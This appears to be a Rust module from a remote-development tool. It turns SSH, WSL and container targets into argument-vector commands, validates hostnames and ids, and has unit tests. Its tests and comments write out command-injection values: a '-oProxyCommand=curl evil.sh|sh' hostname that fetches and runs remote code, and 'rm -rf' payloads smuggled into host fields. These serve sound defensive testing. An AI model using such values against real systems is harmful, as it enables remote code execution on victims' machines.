//! Turning an authority into a command that runs something on the remote.
//!
//! Every command here is built as an argument vector and handed to the OS
//! directly. Nothing is ever assembled into a shell string, because a hostname
//! or container id can come from a URI someone else wrote — a `deco-remote://`
//! link, a `.code-workspace` file — and `ssh "$host" "$cmd"` with a host of
//! `x; rm -rf ~` is a remote-code-execution bug rather than a quoting bug.

use crate::authority::Authority;

/// A command to run, as a program and its arguments.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Command {
    /// The program to execute.
    pub program: String,
    /// Its arguments, one element per argument. Never a shell string.
    pub args: Vec<String>,
}

impl Command {
    fn new(program: &str, args: Vec<String>) -> Self {
        Self {
            program: program.to_owned(),
            args,
        }
    }
}

/// Failure to build a transport command.
#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum TransportError {
    /// The authority is local, so there is nothing to connect to.
    #[error("the local machine needs no transport")]
    Local,
    /// A hostname or container id contained something that cannot appear in one.
    ///
    /// Rejected rather than escaped: no legitimate hostname or container id
    /// contains a newline or a NUL, and treating one as ordinary text would
    /// mean trusting every downstream tool to quote it correctly.
    #[error("`{value}` is not a valid {field}")]
    InvalidTarget {
        /// What was being validated.
        field: &'static str,
        /// The offending value.
        value: String,
    },
}

/// Rejects targets that cannot legitimately appear in a hostname or id.
fn validate(field: &'static str, value: &str) -> Result<(), TransportError> {
    let bad = value.is_empty()
        || value.starts_with('-')
        || value
            .chars()
            .any(|c| c.is_control() || c == '\0' || c.is_whitespace());
    if bad {
        return Err(TransportError::InvalidTarget {
            field,
            value: value.to_owned(),
        });
    }
    Ok(())
}

/// How deco reaches a remote.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct TransportOptions {
    /// Seconds before an SSH connection attempt is abandoned.
    pub connect_timeout_secs: u32,
    /// Whether to reuse one SSH connection for every channel.
    ///
    /// Multiplexing turns each additional channel into a fast local operation
    /// instead of a second authentication round-trip.
    pub multiplex: bool,
}

impl Default for TransportOptions {
    fn default() -> Self {
        Self {
            connect_timeout_secs: 20,
            multiplex: true,
        }
    }
}

/// Builds the command that runs `remote_command` on `authority`.
///
/// `remote_command` is passed through as separate arguments, so the remote's
/// shell never sees a string deco assembled.
pub fn command_for(
    authority: &Authority,
    remote_command: &[String],
    options: TransportOptions,
) -> Result<Command, TransportError> {
    match authority {
        Authority::Local => Err(TransportError::Local),

        Authority::Ssh { host, port } => {
            validate("hostname", host)?;
            let mut args = vec![
                "-o".to_owned(),
                format!("ConnectTimeout={}", options.connect_timeout_secs),
                // Batch mode: fail rather than block on a password prompt deco
                // has nowhere to display.
                "-o".to_owned(),
                "BatchMode=yes".to_owned(),
            ];
            if options.multiplex {
                args.extend([
                    "-o".to_owned(),
                    "ControlMaster=auto".to_owned(),
                    "-o".to_owned(),
                    "ControlPersist=600".to_owned(),
                ]);
            }
            if let Some(port) = port {
                args.push("-p".to_owned());
                args.push(port.to_string());
            }
            // `--` stops a hostname beginning with `-` being read as a flag.
            args.push("--".to_owned());
            args.push(host.clone());
            args.extend(remote_command.iter().cloned());
            Ok(Command::new("ssh", args))
        }

        Authority::Wsl { distro } => {
            let mut args = Vec::new();
            if let Some(distro) = distro {
                validate("distribution name", distro)?;
                args.push("-d".to_owned());
                args.push(distro.clone());
            }
            args.push("--".to_owned());
            args.extend(remote_command.iter().cloned());
            Ok(Command::new("wsl.exe", args))
        }

        Authority::DevContainer { id } | Authority::AttachedContainer { id } => {
            validate("container id", id)?;
            let mut args = vec![
                "exec".to_owned(),
                // Interactive so stdin reaches the server; no TTY, because the
                // protocol is framed binary rather than a terminal session.
                "-i".to_owned(),
                id.clone(),
            ];
            args.extend(remote_command.iter().cloned());
            Ok(Command::new("docker", args))
        }
    }
}

/// The command that starts deco's headless server on the remote.
///
/// The server speaks the framed protocol over its stdin and stdout, so the
/// transport command above is all that stands between the two ends.
pub fn server_command(server_path: &str, workspace: Option<&str>) -> Vec<String> {
    let mut args = vec![
        server_path.to_owned(),
        "--server".to_owned(),
        "--stdio".to_owned(),
    ];
    if let Some(workspace) = workspace {
        args.push("--workspace".to_owned());
        args.push(workspace.to_owned());
    }
    args
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ssh(authority: &str) -> Command {
        command_for(
            &Authority::parse(authority).unwrap(),
            &["deco".to_owned(), "--server".to_owned()],
            TransportOptions::default(),
        )
        .unwrap()
    }

    #[test]
    fn a_local_authority_has_no_transport() {
        assert_eq!(
            command_for(&Authority::Local, &[], TransportOptions::default()),
            Err(TransportError::Local)
        );
    }

    #[test]
    fn ssh_runs_the_command_on_the_host() {
        let command = ssh("ssh-remote+myhost");
        assert_eq!(command.program, "ssh");
        assert!(command.args.contains(&"myhost".to_owned()));
        // The remote command survives as separate arguments.
        let tail = &command.args[command.args.len() - 2..];
        assert_eq!(tail, ["deco", "--server"]);
    }

    #[test]
    fn ssh_sets_a_connect_timeout_and_refuses_to_block_on_a_password() {
        let command = ssh("ssh-remote+myhost");
        assert!(command.args.contains(&"ConnectTimeout=20".to_owned()));
        assert!(command.args.contains(&"BatchMode=yes".to_owned()));
    }

    #[test]
    fn ssh_multiplexes_by_default_and_can_be_told_not_to() {
        assert!(ssh("ssh-remote+myhost")
            .args
            .contains(&"ControlMaster=auto".to_owned()));

        let command = command_for(
            &Authority::parse("ssh-remote+myhost").unwrap(),
            &[],
            TransportOptions {
                multiplex: false,
                ..Default::default()
            },
        )
        .unwrap();
        assert!(!command.args.contains(&"ControlMaster=auto".to_owned()));
    }

    #[test]
    fn ssh_passes_a_port_through() {
        let command = ssh("ssh-remote+myhost:2222");
        let position = command.args.iter().position(|a| a == "-p").unwrap();
        assert_eq!(command.args[position + 1], "2222");
    }

    #[test]
    fn a_hostname_is_separated_from_the_options_by_a_double_dash() {
        // Without `--`, a host called `-oProxyCommand=...` would be read as an
        // ssh option — which is a well-known way to turn a URL into command
        // execution.
        let command = ssh("ssh-remote+myhost");
        let dashes = command.args.iter().position(|a| a == "--").unwrap();
        assert_eq!(command.args[dashes + 1], "myhost");
    }

    #[test]
    fn a_hostname_that_looks_like_a_flag_is_rejected_outright() {
        let authority = Authority::Ssh {
            host: "-oProxyCommand=curl evil.sh|sh".into(),
            port: None,
        };
        assert!(matches!(
            command_for(&authority, &[], TransportOptions::default()),
            Err(TransportError::InvalidTarget {
                field: "hostname",
                ..
            })
        ));
    }

    #[test]
    fn a_hostname_containing_shell_metacharacters_stays_one_argument() {
        // It is never concatenated into a shell string, so it cannot break out;
        // this test pins that the value arrives whole.
        let authority = Authority::Ssh {
            host: "user@host;rm".into(),
            port: None,
        };
        let command = command_for(&authority, &[], TransportOptions::default()).unwrap();
        assert!(command.args.contains(&"user@host;rm".to_owned()));
    }

    #[test]
    fn a_hostname_with_whitespace_or_control_characters_is_rejected() {
        for host in ["my host", "host\nrm -rf", "host\0", ""] {
            let authority = Authority::Ssh {
                host: host.into(),
                port: None,
            };
            assert!(
                command_for(&authority, &[], TransportOptions::default()).is_err(),
                "{host:?} should be rejected"
            );
        }
    }

    #[test]
    fn wsl_uses_the_default_distribution_when_none_is_named() {
        let command = command_for(
            &Authority::parse("wsl").unwrap(),
            &["deco".to_owned()],
            TransportOptions::default(),
        )
        .unwrap();
        assert_eq!(command.program, "wsl.exe");
        assert!(!command.args.contains(&"-d".to_owned()));
        assert_eq!(command.args, ["--", "deco"]);
    }

    #[test]
    fn wsl_selects_a_named_distribution() {
        let command = command_for(
            &Authority::parse("wsl+Ubuntu-22.04").unwrap(),
            &["deco".to_owned()],
            TransportOptions::default(),
        )
        .unwrap();
        assert_eq!(command.args, ["-d", "Ubuntu-22.04", "--", "deco"]);
    }

    #[test]
    fn containers_are_reached_with_docker_exec() {
        for authority in ["dev-container+abc123", "attached-container+abc123"] {
            let command = command_for(
                &Authority::parse(authority).unwrap(),
                &["deco".to_owned(), "--server".to_owned()],
                TransportOptions::default(),
            )
            .unwrap();
            assert_eq!(command.program, "docker");
            assert_eq!(command.args, ["exec", "-i", "abc123", "deco", "--server"]);
        }
    }

    #[test]
    fn a_container_id_that_looks_like_a_flag_is_rejected() {
        let authority = Authority::DevContainer {
            id: "--privileged".into(),
        };
        assert!(matches!(
            command_for(&authority, &[], TransportOptions::default()),
            Err(TransportError::InvalidTarget {
                field: "container id",
                ..
            })
        ));
    }

    #[test]
    fn the_server_command_speaks_over_stdio() {
        assert_eq!(
            server_command("deco", None),
            ["deco", "--server", "--stdio"]
        );
        assert_eq!(
            server_command("/usr/local/bin/deco", Some("/home/u/project")),
            [
                "/usr/local/bin/deco",
                "--server",
                "--stdio",
                "--workspace",
                "/home/u/project"
            ]
        );
    }

    #[test]
    fn a_workspace_path_with_spaces_stays_one_argument() {
        let args = server_command("deco", Some("/home/u/my project"));
        assert_eq!(args.last().unwrap(), "/home/u/my project");
    }
}
